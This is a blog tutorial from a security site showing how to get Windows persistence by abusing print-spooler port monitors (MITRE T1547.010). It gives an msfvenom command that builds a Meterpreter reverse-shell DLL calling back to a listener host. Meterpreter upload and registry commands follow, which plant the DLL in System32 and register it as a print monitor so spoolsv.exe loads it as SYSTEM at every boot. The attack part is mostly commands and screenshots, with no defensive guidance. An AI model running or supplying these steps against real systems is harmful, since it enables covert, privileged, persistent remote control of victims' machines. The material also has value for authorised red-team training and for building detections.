<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/persistence/" rel="category tag">Persistence</a></span>            </div>
            <h1 class="post-title entry-title">Windows Persistence: Port Monitors</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-persistence-port-monitors/" rel="bookmark"><time class="entry-date published" datetime="2020-07-14T21:12:43+00:00">July 14, 2020</time><time class="updated" datetime="2025-05-11T20:40:55+00:00">May 11, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="" data-start="166" data-end="677"><span style="color: #000000;">The article <strong data-start="178" data-end="223">“Windows Persistence using Port Monitors”</strong> explores a lesser-known but effective technique for maintaining unauthorized access on a compromised Windows system. Typically, systems use Port Monitors for printer-related tasks. However, attackers take advantage of them by loading malicious DLLs during system startup. As a result, they enable stealthy persistence. This method helps adversaries blend into normal system operations. In addition, it allows them to maintain access even after reboots.</span></p>
<p class="" data-start="679" data-end="870"><span style="color: #000000;">Moreover, the article provides a practical walkthrough. It explains how this persistence mechanism functions. It also details how attackers can leverage it during post-exploitation</span> <span style="color: #000000;">scenarios.</span></p>
<p><span style="color: #000000;">Adversaries use port monitors to run attacker-supplied DLLs during system boot to achieve persistence or escalate privileges. They configure a port monitor using theAddMonitor API call, which sets a DLL to load at startup. Attackers place this DLL inC:\Windows\System32, and the print spooler service,spoolsv.exe, loads it when the system boots. Moreover, the spoolsv.exe process runs with SYSTEM-level permissions, which gives the attacker high-level access.</span></p>
<p><span style="color: #000000;"><strong>Mitre ID:</strong> T1547.010</span></p>
<p><span style="color: #000000;"><strong>Sub-technique of:</strong>  <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://attack.mitre.org/techniques/T1547/">T1547</a></strong></span></span></p>
<p><span style="color: #000000;"><em>Let’s Check and try to perform this attack</em></span></p>
<h3><span style="color: #800000;">Generate DLL Payload</span></h3>
<p><span style="color: #000000;">In order to launch dll persistence attack, you need to execute the following command which will generate a malicious dll payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.112 lport=4444 -f dll &gt; raj.dll</pre>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-ocRXM48O1iI/XxNlYEaBILI/AAAAAAAAmFI/jjbXNo09HK8fHaOD1lX39XZKTq35B5pYwCLcBGAsYHQ/s1600/1.png" alt="Windows Persistence using Port Monitors" width="877" height="143"/></span></p>
<h3><span style="color: #800000;">Inject DLL Payload</span></h3>
<p><span style="color: #000000;">Now, inject the malicious DLL file into the victim’s machine inside the <strong data-start="944" data-end="957">/system32</strong> directory using your Meterpreter session with administrative privileges. Afterward, execute the following command to modify the registry for printer driver installation.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /root/raj.dll .
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run\\ -v ignite -d 'C:\Windows\System32\netsh'
shell
reg add "hklm\system\currentcontrolset\control\print\monitors\ignite" /v "Driver" /d "raj.dll" /t REG_SZ</pre>
<p><span style="color: #000000;">As you can see in the given below image that we have successfully changed the registry key.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gx5_ae1vHrY/XxNlf21bw3I/AAAAAAAAmFM/5nabBG5nESA8sgr0IIZbHDfhxZd9Tl0xACLcBGAsYHQ/s1600/2.png"/></span></p>
<h3><span style="color: #800000;">Maintain Access</span></h3>
<p><span style="color: #000000;">Now, in future when the attack will launch the listener for obtaining a reverse connection. So, as soon as the victim’s machine get reboots the .dll file get active and the attacker will get meterpreter session due to Monitor DLLs that are loaded by spoolsv.exe for DLLs.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-6l7AQcEh0LU/XxNljdrVDwI/AAAAAAAAmFQ/tVwpoqWW2nMJeBNUe_IUbTEjvyLmpA__ACLcBGAsYHQ/s1600/3.png" alt="Windows Persistence using Port Monitors" width="728" height="362"/></span></p>
<p>Follow this <strong><a href="https://www.hackingarticles.in/tag/windows-persistence/">Link</a></strong> to know more on Windows Persistence.</p>
<p><span style="color: #000000;"><strong>Reference</strong>: https://attack.mitre.org/techniques/T1547/010/</span></p>
<p><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a href="https://www.linkedin.com/in/aarti--singh/"> <span style="color: #0000ff;">here</span></a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
